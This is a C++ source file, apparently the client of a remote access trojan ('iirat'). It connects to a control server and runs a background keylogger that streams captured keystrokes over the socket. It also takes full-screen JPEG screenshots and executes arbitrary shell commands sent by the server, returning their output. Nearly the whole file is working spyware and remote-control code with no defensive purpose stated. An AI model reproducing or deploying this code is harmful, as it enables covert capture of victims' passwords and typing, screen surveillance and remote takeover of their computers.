/*
* @Author: amaneureka
* @Date:   2017-04-02 03:33:49
* @Last Modified by:   amaneureka
* @Last Modified time: 2017-04-08 10:08:01
*/

#include <vector>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <pthread.h>
#include <fstream>
#include <sstream>

using namespace std;

#if __WIN__

    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 -lgdiplus -lole32 */

    /* supporting win 7 or later only */
    #define WINVER _WIN32_WINNT_WIN7
    #define _WIN32_WINNT _WIN32_WINNT_WIN7

    #include <windows.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    #include <gdiplus.h>

    using namespace Gdiplus;

    /* simple POSIX to windows translation */
    #define sleep Sleep
    #define read(soc, buf, len) recv(soc, buf, len, 0)
    #define write(soc, buf, len) send(soc, buf, len, 0)

#elif __LINUX__

    /* g++ -std=c++11 iirat.cpp -D__LINUX__ */

    #include <unistd.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    #include <netinet/in.h>

#else

    "You forget to define platform"

#endif

static bool logged_in = false;

/* concerned special keycodes */
char keycodes[] =
{
    VK_LBUTTON,
    VK_RBUTTON,
    VK_MBUTTON,
    VK_BACK,
    VK_TAB,
    VK_RETURN,
    VK_SHIFT,
    VK_CONTROL,
    VK_MENU,
    VK_CAPITAL,
    VK_ESCAPE,
    VK_SPACE,
    VK_PRIOR,
    VK_PRIOR,
    VK_HOME,
    VK_LEFT,
    VK_UP,
    VK_RIGHT,
    VK_DOWN,
    VK_SNAPSHOT,
    VK_INSERT,
    VK_DELETE,

    VK_NUMPAD0,
    VK_NUMPAD1,
    VK_NUMPAD2,
    VK_NUMPAD3,
    VK_NUMPAD4,
    VK_NUMPAD5,
    VK_NUMPAD6,
    VK_NUMPAD7,
    VK_NUMPAD8,
    VK_NUMPAD9,

    VK_MULTIPLY,
    VK_ADD,
    VK_SEPARATOR,
    VK_SUBTRACT,
    VK_DECIMAL,
    VK_DIVIDE
};

bool command_ack = false;
pthread_mutex_t mutex_socket;
int send_request(int socket, const char *buffer, int size, bool applylock)
{
    int status = 0, wait = 3;

    /* do we need to apply lock? */
    if (applylock) pthread_mutex_lock(&mutex_socket);

    command_ack = false;
    write(socket, buffer, size);

    while(!command_ack && wait-- > 0)
        sleep(10);

    status = command_ack == true;

    if (applylock) pthread_mutex_unlock(&mutex_socket);
    return status;
}

void *logger(void *args)
{
    int i, index = 3;
    int socket = *(int*)args;
    vector<char> buffer(100);

    sprintf(buffer.data(), "SAV");
    while(true)
    {
        // maximum of 3 entries can be made in a single loop so 1020
        if (index >= 90)
        {
            /* send data */
            send_request(socket, buffer.data(), index, true);

            /* reset buffer */
            index = 3;
        }

        for (int i = 0; i < sizeof(keycodes); i++)
        {
            /* get special key's status */
            if (GetAsyncKeyState(keycodes[i]))
                buffer[index++] = i;
        }

        for (int i = 0x41; i < 0x5B; i++)
        {
            /* get alphabets */
            if (GetAsyncKeyState(i))
                buffer[index++] = i;
        }

        for (int i = 0x30; i < 0x3A; i++)
        {
            /* get numeric keys */
            if (GetAsyncKeyState(i))
                buffer[index++] = i;
        }

        sleep(100);
    }
}

void register_device(int socket, string recv_uid)
{
    ifstream infile;
    ofstream outfile;
    char filename[] = ".socket";

    if (recv_uid.size())
    {
        remove(filename);
        outfile.open(filename);
        outfile << recv_uid;
        outfile.close();
    }

    infile.open(filename);

    if (!infile)
    {
        write(socket, "REG", 4);
        return;
    }

    string uid;
    infile >> uid;
    infile.close();

    uid = "LOG" + uid;
    write(socket, uid.c_str(), uid.size());
}

struct cmd_args
{
    int socket;
    string cmd;
};

void *execute_cmd(void* arguments)
{
    int len;
    FILE *pPipe;
    char buffer[150];
    struct cmd_args *args;

    args = (struct cmd_args *)arguments;
    cout << args->cmd << endl;

    fflush(stdin);
    pPipe = popen(args->cmd.c_str(), "r");
    if (pPipe == NULL)
    {
        sprintf(buffer, "RSP%07dFailed to create pipe!", 0);
        send_request(args->socket, buffer, strlen(buffer), true);
        return NULL;
    }

    /* we want this data to be contigous */

    // lock socket write stream
    pthread_mutex_lock(&mutex_socket);

    string str;
    while(fgets(buffer, 128, pPipe))
    {
        str = buffer;
        len = strlen(buffer) + 10;
        sprintf(buffer, "RSP%07d%s", len, str.c_str());
        send_request(args->socket, buffer, len, false);
    }

    // unlock socket write stream
    pthread_mutex_unlock(&mutex_socket);

    pclose(pPipe);
    return NULL;
}

/* https://msdn.microsoft.com/en-us/library/windows/desktop/ms533843(v=vs.85).aspx */
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT num = 0;
    UINT size = 0;

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    GetImageEncoders(num, size, pImageCodecInfo);

    for(UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

void *get_screenshot(void* arguments)
{
    CLSID clsid;
    ULONG quality;
    int width, height;
    HDC screenDC, memDC;
    struct cmd_args *args;
    HBITMAP memBit, oldbit;
    ULONG_PTR gdiplusToken;
    EncoderParameters encoderParameters;
    GdiplusStartupInput gdiplusStartupInput;

    args = (struct cmd_args *)arguments;

    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    screenDC = GetDC(NULL);
    memDC = CreateCompatibleDC(screenDC);
    memBit = CreateCompatibleBitmap(screenDC, width, height);

    oldbit = (HBITMAP)SelectObject(memDC, memBit);
    BitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);

    Bitmap bitmap(memBit, NULL);
    GetEncoderClsid(L"image/jpeg", &clsid);

    quality = 20;
    encoderParameters.Count = 1;
    encoderParameters.Parameter[0].Guid = EncoderQuality;
    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParameters.Parameter[0].NumberOfValues = 1;
    encoderParameters.Parameter[0].Value = &quality;

    IStream *pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    bitmap.Save(pStream, &clsid, &encoderParameters);

    STATSTG stg = {};
    ULARGE_INTEGER pos = {};
    LARGE_INTEGER liZero = {};

    pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
    pStream->Stat(&stg, STATFLAG_NONAME);

    char buffer[1024];
    ULONG bytesRead = 0;
    int size2read = stg.cbSize.LowPart;

    sprintf(buffer, "RSP%07d", size2read + 10);

    /* we want this data to be contigous */

    // lock socket write stream
    pthread_mutex_lock(&mutex_socket);

    send_request(args->socket, buffer, strlen(buffer), false);
    for (int i = 0; i < size2read; i += 1000)
    {
        pStream->Read(buffer, 1000, &bytesRead);
        send_request(args->socket, buffer, bytesRead, false);
    }

    // unlock socket write stream
    pthread_mutex_unlock(&mutex_socket);
    return NULL;
}

int main(int argc, char *argv[])
{
    int sock, len;
    string cmd, req;
    vector<char> buffer(1030);
    struct sockaddr_in addr;
    struct cmd_args cmdargs;
    fd_set active_fd_set, read_fd_set;

    pthread_t logger_thread, cmd_thread;

    /* create socket */
    sock = socket(AF_INET , SOCK_STREAM , 0);
    if (sock < 0)
    {
        printf("could not create socket\n");
        exit(0);
    }

    /* configurations */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9009);

    if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) <= 0)
    {
        printf("address resolve failed\n");
        exit(0);
    }

    /* try to connect */
    if (connect(sock, (struct sockaddr *)&addr , sizeof(addr)) < 0)
    {
        printf("Unable to connect\n");
        exit(0);
    }

    printf("Server Connected :)\n");

    /* add client and stdin to read list */
    FD_ZERO(&active_fd_set);
    FD_SET(sock, &active_fd_set);
    //FD_SET(0, &active_fd_set);

    /* start background tasks */
    pthread_mutex_init(&mutex_socket, NULL);
    pthread_create(&logger_thread, NULL, &logger, &sock);

    while(true)
    {
        read_fd_set = active_fd_set;

        if (select(FD_SETSIZE, &read_fd_set, NULL, NULL, NULL) < 0)
        {
            printf("select error\n");
            exit(0);
        }

        for (int i = 0; i < FD_SETSIZE; i++)
        {
            if (FD_ISSET(i, &read_fd_set))
            {
                if (i == sock)
                {
                    if ((len = read(sock, buffer.data(), buffer.size())) <= 0)
                    {
                        printf("\ndisconnected from the server\n");
                        exit(0);
                    }

                    // null termination
                    buffer[len] = 0;

                    cmd = buffer.data();
                    req = cmd.substr(0, 3);

                    if (req == "UID")
                    {
                        printf("[UID] key=\'%s\'\n", cmd.substr(3).c_str());

                        /* change current state */
                        logged_in = false;

                        /* save new uid and login again */
                        register_device(sock, cmd.substr(3));
                    }
                    else if (req == "HLO")
                    {
                        printf("[HLO] Hello!\n");

                        /* login successful */
                        logged_in = true;
                    }
                    else if (req == "INV")
                    {
                        printf("[INV] Invalid\n");

                        remove(".socket");

                        /* invalid command */
                        logged_in = false;

                        /* try to login again */
                        register_device(sock, "");
                    }
                    else if (req == "IDY")
                    {
                        printf("[IDY] Identify\n");

                        /* session flushed */
                        logged_in = false;

                        /* try to login again */
                        register_device(sock, "");
                    }
                    else if (req == "CMD")
                    {
                        printf("[CMD] \'%s\'\n", req.c_str());

                        req = cmd.substr(3, 4);

                        if (pthread_cancel(cmd_thread))
                            printf("Failed to kill previous thread\n");

                        cmdargs.socket = sock;
                        cmdargs.cmd = cmd.substr(7);

                        if (req == "SSCR")
                            /* get screenshot */
                            pthread_create(&cmd_thread, NULL, &get_screenshot, &cmdargs);

                        else if (req == "EXEC")
                            /* command to execute */
                            pthread_create(&cmd_thread, NULL, &execute_cmd, &cmdargs);
                    }
                    else if (req == "ACK")
                    {
                        /* set ack status flag */
                        command_ack = true;
                    }
                }
            }
        }
    }

    return 0;
}
